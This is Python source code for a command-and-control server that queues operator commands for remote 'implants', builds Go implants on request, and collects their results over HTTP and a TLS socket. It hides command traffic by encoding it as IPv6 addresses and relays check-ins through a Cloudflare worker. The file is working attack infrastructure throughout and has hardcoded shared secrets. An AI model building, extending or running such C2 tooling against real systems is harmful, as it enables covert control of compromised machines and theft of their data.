import hashlib
import hmac
import json
import logging
import os
import socket
import ssl
import subprocess
import threading
import time
from queue import Queue, Empty
from threading import Thread
import secrets

from flask import Flask, request, jsonify

import ipv6_encoder
import pw_hash

app = Flask(__name__)
implant_checkout = {}

operator_session_tokens = set()

# Command queues for each implant identified by a 4-digit ID
implant_command_queues = {
    "1234": Queue(),
    "5678": Queue(),
}

# Result storage for each user
# Keeping this as a nested dict for now
result_storage = {
    """
    This is a nested dict for now
    The intention is that a user will interact with multiple implants
    Then to get the results from individual implants, they search for the implant key
    The value they get is the first element which can then be popped to move others up
    """
    "tester": [],
    "matt_tester": [],
}

# Logger configuration
logger = logging.getLogger(__name__)
logging.basicConfig(
    filename='server.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)


def verify_auth_token(uri, received_token, received_timestamp):
    """
    Verifies HMAC auth tokens sent by clients to verify identity
    :param uri: The URI that the request came to
    :param received_token: The HMAC token sent with the request
    :param received_timestamp: The timestamp that the token was sent
    :return: bool depending on comparison outcome
    """
    secret_key = "4321"
    time_window = 60  # Allow a 60-second window for token validity
    # Ensure the timestamp is within the allowed time window
    current_time = int(time.time())
    if abs(current_time - int(received_timestamp)) > time_window:
        logger.error("token past time window")
        return False

    # Recalculate the HMAC based on the URI and timestamp
    message = f"{uri}:{received_timestamp}"
    hmac_obj = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256)
    computed_token = hmac_obj.hexdigest()

    # Verify the token
    return hmac.compare_digest(computed_token, received_token)


def build_implant(protocol):
    """
    Builds an implant for the selected protocol
    :param protocol: The protocol to communicate over
    :return: bool depending on build success
    """
    match protocol:
        case "http":
            try:
                os.chdir("./implant")
                subprocess.run(["go", "build", "-tags", "http", "./http"],check=True, capture_output=True, text=True)
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False


def add_user(new_user_id):
    """
    Adds a new user to the result storage dict
    :param new_user_id: The users ID to add
    :return: Nothing
    """
    logger.info(f"adding new user {new_user_id}")
    result_storage.setdefault(new_user_id, [])


def add_command(implant_id, operator, command):
    """
    Add a command to the implants queue
    :param implant_id: The implant ID to send the command to
    :param operator: The operator who set the command
    :param command: The command itself to be run
    :return: Nothing
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")
    else:
        logger.error(f"No queue found for implant {implant_id}, creating one")
        implant_command_queues.setdefault(implant_id, Queue())
        implant_command_queues[implant_id].put(command)
        logger.info(f"Added command for implant {implant_id}: {command}")


def get_results(user_id):
    """
    Get the users result storage
    :param user_id: The user ID to get the storage for
    :return: The results if any
    """
    fetched = str(result_storage.get(user_id, []))
    logger.info(f"got results {fetched}")
    result_storage.pop(user_id, 0)
    return fetched


def get_waiting_command(implant_id):
    """
    Gets the oldest command waiting in the implants queue
    :param implant_id: The implant ID to get the queue for
    :return: Either the operator name who set it and the command or False/False
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        try:
            operator, command = queue.get()
            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
            return operator, command
        except Empty:
            logger.info(f"No commands available for {implant_id}")
            return False, False
    else:
        logger.info(f"No queue found for {implant_id}")
        return False, False


def handle_update(uname, implant_id, result):
    """
    Handle implants sending results of commands to the server
    :param uname: The user who should get the results
    :param implant_id: The implant ID associated with the command
    :param result: The result sent by the implant
    :return: Boolean: True if success, otherwise returns error
    """
    try:
        # decoded_res = ipv6_encoder.ipv6_to_string(result)
        logger.info(f"first 10 bytes {result[:10]}")
        dict_store = {implant_id: result}
        result_storage.setdefault(uname, []).append(dict_store)
        logger.info(f"new result saved for user: {uname}")
        return True
    except Exception as e:
        logger.error(f"error occurred saving result for implant: {e}")
        return e


def checkout_command(imp_id, user_id):
    """
    Creates a queue that has the implant ID as the key and adds the user to it
    Informs the server who needs the latest result
    :param imp_id: The ID for the implant
    :param user_id: The ID for the user who sent the command
    :return:
    """
    implant_checkout.setdefault(imp_id, Queue())
    implant_checkout[imp_id].put(user_id)


def handle_client(client_socket):
    """
    Handles the client sending and retrieving info
    :param client_socket: The socket object the client uses to connect
    :return: Uses the client socket to send data, function returns nothing
    """
    try:
        # Receive the client's initial message
        client_request = client_socket.recv(1024).decode()

        # Check what type of message it is first before processing further
        request_type, *remainder = client_request.split(" ", 1)

        match request_type:
            case "AUTH":
                logger.info("authenticating user")
                request_type, uname, passwd = client_request.split(" ", 2)
                logger.info(f"checking authentication details for {uname}")
                if pw_hash.compare_hash(uname, passwd):
                    logger.info("user authenticated, generating session token")
                    returned_token = secrets.token_hex()
                    client_socket.send(returned_token.encode())
                    operator_session_tokens.add(returned_token)
                else:
                    client_socket.send("Bad username or password\n".encode())

            case "PUB":
                logger.info("request to send command, attempting")
                request_type, implant_id, uname, token, *command = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    command = command[0] if command else ""
                    add_command(implant_id, uname, command)
                    client_socket.send("Command queued\n".encode())
                    logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                else:
                    logger.error("bad token")
                    client_socket.send("Bad token\n".encode())

            case "RTR":
                logger.info("controller requesting implant last messages")
                request_type, uname, token, *message = client_request.split(" ", 3)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    results = get_results(uname)
                    client_socket.send(results.encode())
                    logger.info(f"sent controller results {results}")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case "BLD":
                logger.info("controller building new implant")
                request_type, uname, token, *message = client_request.split(" ", 3)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    bld_status = build_implant(message)
                    if bld_status is True:
                        client_socket.send("Building implant succeeded!")
                    else:
                        client_socket.send("Building implant failed...")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case _:
                logger.error(f"unknown command: {request_type}")
                client_socket.send("Unknown command\n".encode())

    except Exception as e:
        logger.error(f"Error occurred when trying to receive connection {e}")
    finally:
        client_socket.close()


@app.route('/auth/<path:path>', methods=['GET'])
def authenticated_get(path):
    """
    Verifies requests for commands with an HMAC and shared key
    :param path: This represents the implant ID
    :return: Either the waiting command or error
    """
    rcv_token = request.args.get("token")
    rcv_timestamp = request.args.get("timestamp")
    # Get the message FIFO
    logger.info("GET incoming for authenticated listener URI")
    if verify_auth_token(path, rcv_token, rcv_timestamp) is True:
        try:
            operator, command = get_waiting_command(path)
            if operator and command is False:
                logger.error("operator and command in queue are false")
                return "error"
            checkout_command(path, operator)
            command = json.dumps(ipv6_encoder.string_to_ipv6(command))
            logger.info("sending command and HMAC to implant")
            hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
            hmac_sig = hmac_k.hexdigest()
            return jsonify(
                message=command,
                key=hmac_sig
            )
        except Exception as e:
            logger.error(f"error: {e}")
            return "error"
    else:
        logger.error(f"error: verify_auth_token failed")
        return "error"


@app.route('/direct/<path:path>', methods=['GET'])
def http_get(path):
    """
    Handles implants skipping the CF Worker and using basic HTTP for check-in
    :param path: This represents the implant ID
    :return: Either the waiting command or error
    """
    # Get the message FIFO
    logger.info("GET incoming for basic HTTP listener URI")
    try:
        operator, command = get_waiting_command(path)
        if operator and command is False:
            logger.error("error")
            return "error"
        checkout_command(path, operator)
        command = json.dumps(ipv6_encoder.string_to_ipv6(command))
        logger.info("sending command and HMAC to implant")
        hmac_k = hmac.new("1234".encode(), command.encode(), hashlib.sha256)
        hmac_sig = hmac_k.hexdigest()
        return jsonify(
            message=command,
            key=hmac_sig
        )
    except Exception as e:
        logger.error(f"error: {e}")
        return "error"


@app.route('/<path:path>', methods=['GET'])
def catch_all_get(path):
    """
    Handles the CF JS worker script getting waiting commands in IPv6 format
    :param path: This represents the implant ID
    :return: Either the waiting command or error
    """
    # Get the message FIFO
    logger.info("GET incoming for DNS URI path")
    try:
        operator, command = get_waiting_command(path)
        if operator and command is False:
            logger.error("error")
            return "error"
        checkout_command(path, operator)
        logger.info("sending IPv6 encoded command to CF worker")
        return ipv6_encoder.string_to_ipv6(command)
    except Exception as e:
        logger.error(f"error: {e}")
        return "error"


@app.route('/<path:path>', methods=['POST'])
def catch_all_post(path):
    """
    Implants either directly or through the CF worker send results here
    POSTS come in as JSON, need a msg field
    Will eventually probably also use the HMAC to verify authenticity
    :param path: This represents the implant ID
    :return: Either 200 or error
    """
    try:
        logger.info(f"{path} sending us data")
        # Get the data
        result = request.get_json()
        # The result comes in as a JSON object under the field msg
        result = result.get("msg")
        # Check which operator is waiting for a result
        queue = implant_checkout[path]
        logger.info("got queue for operator")
        operator = queue.get()
        logger.info(f"sending {operator} command")
        decoded_res = ipv6_encoder.ipv6_to_string(result.split("\n"))
        handle_update(operator, path, decoded_res)
        return "200"
    except Exception as e:
        logger.error(f"error getting data: {e}")
        return "error"


def start_flask():
    app.run()


def start_server():
    """
    Start the socket server and the flask server
    Run an infinite loop until cancelled to handle socket requests
    :return: Nothing
    """
    flask_thread = Thread(target=start_flask)
    flask_thread.start()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Bind to any available interface
    server.listen(5)
    server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_context.minimum_version = ssl.TLSVersion.TLSv1_3
    server_context.maximum_version = ssl.TLSVersion.TLSv1_3
    server_context.load_cert_chain(certfile="server.pem")
    server_context.verify_mode = ssl.CERT_NONE
    secure_socket = server_context.wrap_socket(
        server,
        server_side=True,
    )
    logger.info("TLS socket wrapped and starting on port 9999\n")

    while True:
        client_socket, addr = secure_socket.accept()
        logger.info(f"Accepted connection from: {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


if __name__ == "__main__":
    start_server()
